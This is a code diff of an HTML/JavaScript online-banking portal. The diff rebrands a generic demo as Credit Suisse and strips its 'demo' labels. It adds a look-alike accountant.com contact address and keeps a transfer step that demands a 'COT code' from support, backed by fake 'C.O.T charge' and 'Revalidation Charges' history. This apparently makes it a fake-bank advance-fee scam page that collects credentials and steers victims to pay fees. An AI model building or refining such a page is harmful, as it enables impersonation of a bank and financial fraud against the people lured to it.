@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Secure Portal</title>
+  <title>Credit Suisse • Secure Portal</title>
  <style>
 body {
   margin:0;
@@ -128,7 +128,9 @@ footer { margin:40px auto 20px; text-align:center; font-size:12px; color:#6b7280
 }
 
 .sidebar a:hover { background:rgba(255,255,255,0.12); }
-.sidebar a.active { background:rgba(255,255,255,0.18); }
+.sidebar a.active { 
+  background: #1e3a6b;  /* More subtle active state */
+}
 
 /* CONTENT PANELS */
 .content {
@@ -711,6 +713,39 @@ button:active {
 .generate-report-btn:hover {
   background: #e5e7eb;
 }
+
+/* Pending animation */
+.pending-dots {
+  display: inline-block;
+}
+.pending-dots:after {
+  content: '.';
+  animation: dots 1.5s steps(5, end) infinite;
+}
+@keyframes dots {
+  0%, 20% { content: '.'; }
+  40% { content: '..'; }
+  60% { content: '...'; }
+  80%, 100% { content: ''; }
+}
+
+/* Contact Relationship Manager Button */
+.rm-button {
+  background: #f5f7fa;
+  color: #003a8f;
+  border: 1px solid #003a8f;
+  padding: 8px 12px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 13px;
+  margin-top: 8px;
+  width: auto;
+  display: inline-block;
+}
+
+.rm-button:hover {
+  background: #e5e7eb;
+}
 </style>
 </head>
 <body>
@@ -730,7 +765,7 @@ button:active {
     z-index:10;
   ">
     <img src="https://res.cloudinary.com/do9yjpizs/image/upload/v1771185812/wn6e9zmpiinkjfeydgna.png"
-         alt="My Logo"
+         alt="Credit Suisse"
          style="height:40px; display:block;">
   </div>
 
@@ -765,7 +800,8 @@ button:active {
         <p>Please enter your credentials.</p>
 
         <form onsubmit="event.preventDefault();login();">
-          <label for="user">User ID</label>
+          <!-- CHANGED: Padlock after label, before colon -->
+          <label for="user">User ID 🔒:</label>
           <input id="user" type="text" />
 
           <label for="pass">Password</label>
@@ -775,6 +811,9 @@ button:active {
   Fetching your account...
           </div>       
 
+          <!-- CHANGED: Error moved above button -->
+          <div id="loginError" class="muted" style="color:#b91c1c;margin-top:12px;margin-bottom:12px;display:none;">Invalid username or password.</div>
+          
           <button type="submit">Log in</button>
 
           <div class="links">
@@ -786,15 +825,13 @@ button:active {
             For your security, please ensure that your browser address bar shows a secure connection.
             Never share your login credentials with anyone.
           </div>
-
-          <div id="loginError" class="muted" style="color:#b91c1c;margin-top:12px;display:none;">Invalid username or password.</div>
         </form>
       </div>
     </div>
 
     <div class="footer-spacer"></div>
     <footer>
-      © 2026 Your Company. All rights reserved.
+      © 2026 Credit Suisse. All rights reserved.
     </footer>
   </div>
 
@@ -855,8 +892,8 @@ button:active {
     <a href="#" onclick="showSection('portfolio')">Portfolio</a>
     <a href="#" onclick="showSection('markets')">Market Services</a>
     <a href="#" onclick="showSection('settings')">Settings</a>
-    <!-- NEW: Contact Support link -->
-    <a href="#" onclick="openSupport()" style="border-top: 1px solid rgba(255,255,255,0.2); margin-top: 10px; padding-top: 15px;">📞 Contact Support</a>
+    <!-- CHANGED: Contact Support link - no border, matches others -->
+    <a href="#" onclick="openSupport()">Contact Support</a>
     <a href="#" onclick="logout()">Log out</a>
   </div>
 
@@ -883,7 +920,7 @@ button:active {
     <div id="payments" class="panel hidden">
       <h2>Payments</h2>
       
-      <!-- NEW: QR-Bill Scanning Button -->
+      <!-- QR-Bill Scanning Button -->
       <button class="qr-bill-btn" onclick="openQRScanner()" style="margin-bottom: 20px;">📱 Scan QR-Bill</button>
       
       <div id="transferMessage" class="muted hidden"
@@ -899,7 +936,6 @@ button:active {
     <option value="internal">Internal Transfer</option>
     <option value="fx">FX Transfer</option>
   </select>
-  <!-- Error banner moved below fields, above button -->
   <div id="transferBanner" style="display:none; margin:10px 0; padding:10px 14px; border-radius:4px; font-size:14px; color:#fff;"></div>
   <button onclick="nextTransferStep()">Continue</button>
 </div>
@@ -911,25 +947,20 @@ button:active {
   <label>IBAN / Account Number</label><input type="text" id="accountNumber" placeholder="IBAN or Account Number">
   <label>SWIFT / BIC</label><input type="text" id="swiftBic" placeholder="SWIFT / BIC">
   <label>Country</label><input type="text" id="country" placeholder="Country">
-  <!-- CHANGED: Removed currency field, added CHF indicator -->
   <label>Amount (CHF)</label><input type="text" id="transferAmount" placeholder="0.00">
   <small style="color:#6b7280; margin-top:-15px; margin-bottom:15px; display:block;">Only CHF transfers are supported</small>
   <label>Reference</label><input type="text" id="transferReference" placeholder="Reference">
-  <!-- Error banner moved below fields, above button -->
   <div id="transferBanner2" style="display:none; margin:10px 0; padding:10px 14px; border-radius:4px; font-size:14px; color:#fff;"></div>
   <button onclick="nextTransferStep()">Review Transfer</button>
 </div>
         
-      <!-- STEP 3: Review + COT -->
+      <!-- STEP 3: Review + COT - CHANGED: Removed label and demo code line -->
       <div id="transferStep3" class="hidden">
         <p><strong>COT Code Required</strong></p>
         <p>For security reasons, this transaction requires a COT code. Please contact Credit Suisse support to obtain your COT code.</p>
-        <!-- NEW: Support link in COT step -->
         <div class="support-link" onclick="openSupport()">💬 Need a code? Contact Support now</div>
-        <label>COT Code</label>
+        <!-- Only input field with placeholder - no label above it -->
         <input type="text" id="cotCode" placeholder="Enter COT Code">
-        <p style="font-size:12px; color:#6b7280;">Demo code: COT-884219</p>
-        <!-- Error banner moved below fields, above button -->
         <div id="transferBanner3" style="display:none; margin:10px 0; padding:10px 14px; border-radius:4px; font-size:14px; color:#fff;"></div>
         <button onclick="finalizeTransfer()">Complete Transfer</button>
         <div id="cotError" class="muted" style="color:#b91c1c;margin-top:8px;display:none;">
@@ -938,47 +969,47 @@ button:active {
       </div>
     </div>
 
-    <!-- Transactions Table -->
-<div id="transactions" class="panel">
-  <h2>Recent transactions</h2>
-  <table class="table" id="transactionTable">
-    <thead>
-      <tr>
-        <th>Date</th>
-        <th>Description</th>
-        <th>Amount</th>
-      </tr>
-    </thead>
-    <tbody id="transactionTableBody">
-      <tr><td>25 Feb 2010</td><td>Revalidation Charges</td><td>+ GBP 5000.00</td></tr>
-      <tr><td>19 Feb 2010</td><td>C.O.T charge</td><td>+ GBP 4245.39</td></tr>
-    </tbody>
-  </table>
-</div>
-
-<!-- Transaction Modal -->
-<div id="transactionModal" class="modal">
-  <div class="modal-content">
-    
-    <div style="background:#0a1f44; padding:15px 0; text-align:center; width:100%; border-top-left-radius:10px; border-top-right-radius:10px;">
-  <img src="https://res.cloudinary.com/do9yjpizs/image/upload/v1771185812/wn6e9zmpiinkjfeydgna.png"
-       style="height:35px;">
+    <!-- Transactions Table - CHANGED: Static transactions with times -->
+    <div id="transactions" class="panel">
+      <h2>Recent transactions</h2>
+      <table class="table" id="transactionTable">
+        <thead>
+          <tr>
+            <th>Date</th>
+            <th>Description</th>
+            <th>Amount</th>
+          </tr>
+        </thead>
+        <tbody id="transactionTableBody">
+          <tr data-date="25 Feb 2010 14:30" data-description="Revalidation Charges" data-amount="+ GBP 5000.00" data-reference="REF-CH-2010-0225" data-status="Completed">
+            <td>25 Feb 2010 14:30</td>
+            <td>Revalidation Charges</td>
+            <td>+ GBP 5000.00</td>
+          </tr>
+          <tr data-date="19 Feb 2010 09:15" data-description="C.O.T charge" data-amount="+ GBP 4245.39" data-reference="COT-2010-0219-884" data-status="Completed">
+            <td>19 Feb 2010 09:15</td>
+            <td>C.O.T charge</td>
+            <td>+ GBP 4245.39</td>
+          </tr>
+        </tbody>
+      </table>
     </div>
-    
-    <h3 style="margin-bottom:20px;">Transaction Details</h3>
 
-    <div class="detail-row"><span>Date</span><span id="detailDate"></span></div>
-    <div class="detail-row"><span>Description</span><span id="detailDescription"></span></div>
-    <div class="detail-row"><span>Amount</span><span id="detailAmount"></span></div>
-    <div class="detail-row"><span>Reference</span><span id="detailReference"></span></div>
-    <div class="detail-row"><span>Status</span><span id="detailStatus"></span></div>
-
-    <button onclick="closeModal()" 
-        style="background-color: #003366; color: #ffffff; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer; margin-top:20px;">
-  Close
-    </button>
-  </div>
-</div>
+    <!-- Transaction Modal -->
+    <div id="transactionModal" class="modal">
+      <div class="modal-content">
+        <div style="background:#0a1f44; padding:15px 0; text-align:center; width:100%; border-top-left-radius:10px; border-top-right-radius:10px;">
+          <img src="https://res.cloudinary.com/do9yjpizs/image/upload/v1771185812/wn6e9zmpiinkjfeydgna.png" style="height:35px;">
+        </div>
+        <h3 style="margin-bottom:20px;">Transaction Details</h3>
+        <div class="detail-row"><span>Date</span><span id="detailDate"></span></div>
+        <div class="detail-row"><span>Description</span><span id="detailDescription"></span></div>
+        <div class="detail-row"><span>Amount</span><span id="detailAmount"></span></div>
+        <div class="detail-row"><span>Reference</span><span id="detailReference"></span></div>
+        <div class="detail-row"><span>Status</span><span id="detailStatus"></span></div>
+        <button onclick="closeModal()" style="background-color: #003366; color: #ffffff; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer; margin-top:20px;">Close</button>
+      </div>
+    </div>
 
     <!-- Investments -->
     <div id="investments" class="panel hidden">
@@ -989,7 +1020,6 @@ button:active {
         <tr><td>Swiss Government Bond</td><td>50</td><td>CHF 5,000.00</td><td>+1.1%</td></tr>
         <tr><td>Nestlé Shares</td><td>200</td><td>CHF 22,000.00</td><td>-0.8%</td></tr>
       </table>
-      <!-- NEW: Generate Valuation Report Button -->
       <button class="generate-report-btn" onclick="generateValuationReport()">📊 Generate Valuation Report</button>
       <canvas id="investmentsChart" width="400" height="200"></canvas>
       <div id="investmentsLegend" style="margin-top:12px;font-size:13px;color:#374151;">
@@ -998,7 +1028,6 @@ button:active {
         <div><span style="display:inline-block;width:12px;height:12px;background:#22c55e;margin-right:6px;"></span> Nestlé Shares</div>
       </div>
       <div id="investmentsSummary" style="margin-top:16px;padding:12px;background:#f0f2f5;border-radius:6px;font-size:14px;color:#1a1a1a;"></div>
-      <!-- NEW: Report Result Area -->
       <div id="reportResult" style="margin-top:16px;padding:12px;background:#f0f2f5;border-radius:6px;font-size:14px;color:#1a1a1a; display:none;"></div>
     </div>
 
@@ -1036,13 +1065,8 @@ button:active {
           <p><strong>Branch:</strong> Zurich – Paradeplatz</p>
           <p><strong>Country:</strong> Switzerland</p>
           <p><strong>Relationship Manager:</strong> Anna Keller</p>
-          <!-- NEW: Account Manager Email with template -->
-          <p><strong>Email RM:</strong> 
-            <a href="mailto:credit-suisse.account.mgt@accountant.com?subject=Inquiry%20from%20Online%20Banking%20Client&body=Dear%20Relationship%20Manager%2C%0A%0AI%20would%20like%20to%20inquire%20about%3A%0A%0A%0AThank%20you%20for%20your%20assistance.%0A%0ABest%20regards%2C%0A%5BClient%20Name%5D" 
-               style="color:#003a8f; text-decoration:none;">
-              credit-suisse.account.mgt@accountant.com
-            </a>
-          </p>
+          <!-- CHANGED: Button instead of raw email -->
+          <button class="rm-button" onclick="window.location.href='mailto:credit-suisse.account.mgt@accountant.com?subject=Inquiry%20from%20Online%20Banking%20Client&body=Dear%20Relationship%20Manager%2C%0A%0AI%20would%20like%20to%20inquire%20about%3A%0A%0A%0AThank%20you%20for%20your%20assistance.%0A%0ABest%20regards%2C%0A%5BClient%20Name%5D'">Contact Relationship Manager</button>
         </div>
       </div>
       <div class="settings-section">
@@ -1075,35 +1099,49 @@ button:active {
     </div>
   </div> <!-- end dashboard-content -->
 
-  <!-- Footer always at the bottom -->
+  <!-- Footer -->
   <footer style="text-align:center;font-size:12px;color:#6b7280;margin:20px 0;">
-    © 2026 Your Company. All rights reserved. | Privacy Policy | Legal Notice | Cookies
+    © 2026 Credit Suisse. All rights reserved. | Privacy Policy | Legal Notice | Cookies
   </footer>
     </div>
-        </div>
-
-<!-- QR Scanner Modal (NEW) -->
-<div id="qrScannerModal" class="qr-modal">
-  <div class="qr-modal-content">
-    <h3>Scan QR-Bill</h3>
-    <div class="qr-scanner-placeholder">
-      <div style="text-align: center;">
-        <div style="font-size: 48px; margin-bottom: 10px;">📷</div>
-        <p style="color: #6b7280;">Camera preview would appear here</p>
-        <p style="font-size: 12px; color: #999;">Position QR code in frame</p>
-      </div>
-    </div>
-    <div style="display: flex; gap: 10px;">
-      <button onclick="simulateQRScan()" style="flex: 2;">Simulate Scan</button>
-      <button onclick="closeQRScanner()" class="qr-close-btn" style="flex: 1;">Close</button>
-    </div>
-    <p style="font-size: 12px; color: #6b7280; margin-top: 15px;">Demo: Click "Simulate Scan" to auto-fill</p>
   </div>
-</div>
+
+  <!-- QR Scanner Modal - CHANGED: Removed demo text, changed button to "Scan" -->
+  <div id="qrScannerModal" class="qr-modal">
+    <div class="qr-modal-content">
+      <h3>Scan QR-Bill</h3>
+      <div class="qr-scanner-placeholder">
+        <div style="text-align: center;">
+          <div style="font-size: 48px; margin-bottom: 10px;">📷</div>
+          <p style="color: #6b7280;">Camera preview would appear here</p>
+          <p style="font-size: 12px; color: #999;">Position QR code in frame</p>
+        </div>
+      </div>
+      <div style="display: flex; gap: 10px;">
+        <button onclick="scanQR()" style="flex: 2;">Scan</button>
+        <button onclick="closeQRScanner()" class="qr-close-btn" style="flex: 1;">Close</button>
+      </div>
+      <!-- Removed demo text line -->
+    </div>
+  </div>
 
 <script>
   const encodedUser = btoa('demoUser');
   const STORAGE_KEY = 'bankState';
+  
+  // ===== APPROVED ACCOUNTS LIST (10 realistic international accounts) =====
+  const APPROVED_ACCOUNTS = [
+    '40-02-28 41758239',           // UK HSBC
+    '20-45-78 56918372',           // UK Barclays
+    '10070000 3920184756',          // Germany Deutsche Bank
+    '20040000 8473629105',          // Germany Commerzbank
+    '021000021 417829365',          // US Chase
+    '026009593 628194735',          // US Bank of America
+    '003-12345 4128396',            // Canada RBC
+    '30004 12345 03928471629',      // France BNP Paribas
+    '0483 3128456 79',              // Switzerland Credit Suisse
+    '062-123 417829365'             // Australia Commonwealth
+  ];
 
 function loadState() {
   const saved = localStorage.getItem(STORAGE_KEY);
@@ -1227,26 +1265,71 @@ function updateBalanceDisplay() {
     });
 }
 
-  // ===== UPDATED FUNCTION: Permanent timestamps =====
-  function addTransactionRow(date, description, amount, reference, status) {
+  // ===== UPDATED: Checks pending transactions and restores balance if 24h passed =====
+  function checkPendingTransactions() {
+    const saved = localStorage.getItem('transactions');
+    if (!saved) return;
+    
+    const transactions = JSON.parse(saved);
+    let changed = false;
+    const now = new Date().getTime();
+    
+    transactions.forEach(tx => {
+      if (tx.status === 'Pending' && tx.timestamp) {
+        const txTime = new Date(tx.timestamp).getTime();
+        const hoursDiff = (now - txTime) / (1000 * 60 * 60);
+        
+        if (hoursDiff >= 24) {
+          tx.status = 'Cancelled';
+          // Restore balance
+          const amount = parseFloat(tx.amount.replace(/[^0-9.-]+/g, ''));
+          accountBalance += amount;
+          updateBalanceDisplay();
+          changed = true;
+        }
+      }
+    });
+    
+    if (changed) {
+      localStorage.setItem('transactions', JSON.stringify(transactions));
+      loadSavedTransactions();
+    }
+  }
+
+  function addTransactionRow(date, description, amount, reference, status, timestamp) {
   const tableBody = document.getElementById('transactionTableBody');
   
-  // Store the date as is - no new timestamp if already has time
   let displayDate = date;
+  let statusDisplay = status;
   
-  const row = tableBody.insertRow(0); // add at top (newest first)
+  // Add pending animation if needed
+  if (status === 'Pending') {
+    statusDisplay = '<span class="pending-dots">Pending</span>';
+  }
   
-  row.innerHTML = `
-    <td>${displayDate}</td>
-    <td>${description}</td>
-    <td>${amount}</td>
-  `;
-  
+  const row = tableBody.insertRow(0); // Always at top
+ 
+  // Handle status with potential HTML for animation
+  if (status === 'Pending') {
+    row.innerHTML = `
+      <td>${displayDate}</td>
+      <td>${description}</td>
+      <td>${amount}</td>
+    `;
+  } else {
+    row.innerHTML = `
+      <td>${displayDate}</td>
+      <td>${description}</td>
+      <td>${amount}</td>
+    `;
+  }
+
   row.dataset.date = displayDate;
   row.dataset.description = description;
   row.dataset.amount = amount;
   row.dataset.reference = reference;
   row.dataset.status = status;
+  if (timestamp) row.dataset.timestamp = timestamp;
   
   row.style.cursor = 'pointer';
   
@@ -1482,7 +1565,6 @@ function refreshNewsFeed() {
 let transferStep = 1;
 
 function showTransferMessage(text, type='error', duration=3000, step=1) {
-  // Choose the correct banner based on step
   let banner;
   if (step === 1) banner = document.getElementById('transferBanner');
   else if (step === 2) banner = document.getElementById('transferBanner2');
@@ -1578,6 +1660,7 @@ function finalizeTransfer() {
 
   const amountInput = document.getElementById('transferAmount');
   const beneficiaryInput = document.getElementById('beneficiaryName');
+  const accountInput = document.getElementById('accountNumber').value.trim();
   const amount = parseFloat(amountInput.value);
   const beneficiary = beneficiaryInput.value.trim();
 
@@ -1595,8 +1678,8 @@ function finalizeTransfer() {
   btn.disabled = true;
 
   setTimeout(() => {
-    accountBalance -= amount;
-    updateBalanceDisplay();
+    // Check if account is approved
+    const isApproved = APPROVED_ACCOUNTS.includes(accountInput);
     
     // Get current date and time for permanent timestamp
     const now = new Date();
@@ -1609,28 +1692,45 @@ function finalizeTransfer() {
     });
     const dateTime = `${date} ${time}`;
     
+    let transactionStatus;
+    let transactionAmount = `- CHF ${amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
+    
+    if (isApproved) {
+      // Approved account - deduct immediately
+      accountBalance -= amount;
+      transactionStatus = 'Completed';
+      showTransferMessage("Transfer completed successfully.", "success", 2500, 3);
+    } else {
+      // Unapproved account - pending
+      transactionStatus = 'Pending';
+      accountBalance -= amount; // Hold the amount
+      showTransferMessage("Transfer pending approval.", "success", 2500, 3);
+    }
+    
+    updateBalanceDisplay();
+    
     addTransactionRow(
-      dateTime, // Pass date with time for permanent storage
+      dateTime,
       `Transfer to ${beneficiary}`,
-      `- CHF ${amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}`,
+      transactionAmount,
       'REF-' + Math.floor(Math.random()*1000000),
-      'Completed'
+      transactionStatus,
+      now.toISOString()
     );
 
     const saved = localStorage.getItem('transactions');
     const transactions = saved ? JSON.parse(saved) : [];
 
     transactions.unshift({
-      date: dateTime, // Store with time
+      date: dateTime,
       description: `Transfer to ${beneficiary}`,
-      amount: `- CHF ${amount.toLocaleString(undefined,{minimumFractionDigits:2})}`,
+      amount: transactionAmount,
       reference: 'REF-' + Math.floor(Math.random()*1000000),
-      status: 'Completed'
+      status: transactionStatus,
+      timestamp: now.toISOString()
     });
 
     localStorage.setItem('transactions', JSON.stringify(transactions));
-    
-    showTransferMessage("Transfer completed successfully.", "success", 2500, 3);
 
     setTimeout(() => {
       resetTransfer();
@@ -1671,6 +1771,9 @@ function finalizeTransfer() {
       content.classList.toggle('open');
     });
   });
+  
+  // Check for expired pending transactions
+  checkPendingTransactions();
 });
 
   /* ================= SESSION + OTP CONTROL ================= */
@@ -1930,9 +2033,9 @@ function loadTransactions() {
     row.addEventListener('click', () => showTransactionDetails(tx));
     tableBody.appendChild(row);
   });
-}
+  }
 
-function addTransaction(description, amount, status='Completed') {
+  function addTransaction(description, amount, status='Completed') {
   const today = new Date().toLocaleDateString('en-GB', { day:'2-digit', month:'short', year:'numeric' });
   const reference = 'TXN' + Math.floor(Math.random() * 1e8);
   const tx = { date: today, description, amount, reference, status };
@@ -1966,13 +2069,29 @@ document.addEventListener('DOMContentLoaded', loadTransactions);
 
   const transactions = JSON.parse(saved);
 
+  // Sort by timestamp descending (newest first)
+  transactions.sort((a, b) => {
+    if (a.timestamp && b.timestamp) {
+      return new Date(b.timestamp) - new Date(a.timestamp);
+    }
+    return 0;
+  });
+
+  const tableBody = document.getElementById('transactionTableBody');
+  
+  // Clear but keep static rows
+  const staticRows = Array.from(tableBody.querySelectorAll('tr')).slice(0, 2);
+  tableBody.innerHTML = '';
+  staticRows.forEach(row => tableBody.appendChild(row));
+
   transactions.forEach(tx => {
     addTransactionRow(
       tx.date,
       tx.description,
       tx.amount,
       tx.reference,
-      tx.status
+      tx.status,
+      tx.timestamp
     );
   });
 }
@@ -2008,28 +2127,33 @@ function goToTransactions() {
   showSection('transactions');
   }
 
-/* ================= NEW FUNCTIONS ================= */
+/* ================= UPDATED FUNCTIONS ================= */
 
-// Tidio Support Chat
+// Tidio Support Chat - FIXED to open reliably
 function openSupport() {
+  // Check if Tidio is already loaded
   if (typeof tidioChatApi !== 'undefined') {
     tidioChatApi.open();
+    tidioChatApi.show();
   } else {
-    // Load Tidio script first
+    // Load Tidio script
     var script = document.createElement('script');
     script.src = '//code.tidio.co/yajjxy5t58whrgr6llwhatsrupxhuo3s.js';
+    script.async = true;
     script.onload = function() {
+      // Give it a moment to initialize
       setTimeout(function() {
         if (typeof tidioChatApi !== 'undefined') {
           tidioChatApi.open();
+          tidioChatApi.show();
         }
-      }, 1000);
+      }, 1500);
     };
     document.head.appendChild(script);
   }
 }
 
-// QR Scanner Functions
+// QR Scanner Functions - UPDATED with error message
 function openQRScanner() {
   document.getElementById('qrScannerModal').style.display = 'block';
 }
@@ -2038,25 +2162,31 @@ function closeQRScanner() {
   document.getElementById('qrScannerModal').style.display = 'none';
 }
 
-function simulateQRScan() {
-  // Auto-fill some sample data
-  document.getElementById('beneficiaryName').value = 'Swiss Power AG';
-  document.getElementById('bankName').value = 'Credit Suisse';
-  document.getElementById('accountNumber').value = 'CH93 0076 2011 6238 5295 7';
-  document.getElementById('swiftBic').value = 'CRESCHZZ80A';
-  document.getElementById('country').value = 'Switzerland';
-  document.getElementById('transferAmount').value = '1250.00';
-  document.getElementById('transferReference').value = 'Invoice #QR-2025-001';
-  
+// CHANGED: scanQR function with error message
+function scanQR() {
   closeQRScanner();
   
-  // Show success message
-  alert('QR-Bill scanned successfully! Please review the details.');
+  // Show error message in transfer banner
+  const banner = document.getElementById('transferBanner');
+  if (banner) {
+    banner.textContent = 'This function is not available for your account type.';
+    banner.style.background = '#b91c1c';
+    banner.style.display = 'block';
+    banner.style.opacity = '0';
+    
+    setTimeout(() => banner.style.transition = 'opacity 0.35s ease', 10);
+    setTimeout(() => banner.style.opacity = '1', 20);
+    
+    setTimeout(() => {
+      banner.style.opacity = '0';
+      setTimeout(() => banner.style.display = 'none', 350);
+    }, 3000);
+  }
 }
 
 // Generate Valuation Report
 function generateValuationReport() {
-  const totalValue = 12500 + 5000 + 22000; // From investments table
+  const totalValue = 12500 + 5000 + 22000;
   const reportDiv = document.getElementById('reportResult');
   
   const now = new Date();
@@ -2077,11 +2207,14 @@ function generateValuationReport() {
       <li>Swiss Government Bond: CHF 5,000.00</li>
       <li>Nestlé Shares: CHF 22,000.00</li>
     </ul>
-    <p><em>This is a demo valuation report.</em></p>
+    <p><em>This is your valuation report.</em></p>
   `;
   
   reportDiv.style.display = 'block';
 }
+
+// Periodically check for expired pending transactions
+setInterval(checkPendingTransactions, 60000); // Check every minute
 </script>
 <!-- Tidio script loaded once for support -->
 <script src="//code.tidio.co/yajjxy5t58whrgr6llwhatsrupxhuo3s.js" async></script>
